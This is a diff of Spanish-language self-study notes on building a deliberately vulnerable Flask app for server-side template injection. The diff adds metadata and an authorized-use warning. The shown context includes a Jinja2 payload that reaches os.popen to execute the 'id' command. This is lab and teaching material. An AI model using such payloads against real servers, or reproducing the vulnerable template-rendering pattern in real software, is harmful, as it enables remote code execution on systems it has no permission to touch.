@@ -1,3 +1,15 @@
+---
+title: "15 - Web vulnerable a SSTI"
+date: 2026-08-27
+tags:
+  - self-study
+  - security-penetration-testing
+  - avanzado
+status: verified
+author: "Juan José Restrepo Rosero"
+last_updated: 2026-08-27
+---
+
 Creamos un archivo llamado app.py:
 ```python
 from flask import Flask, request, render_template_string, render_template
@@ -62,3 +74,10 @@ Lo ejecutamos con python y luego si probamos el siguiente payload debería de fu
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
 ```
 ![[Pasted image 20240521125113.png]]
+
+<!-- self-study-knowledge-context -->
+## Contexto de estudio
+- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
+- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
+> [!warning] Uso autorizado
+> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
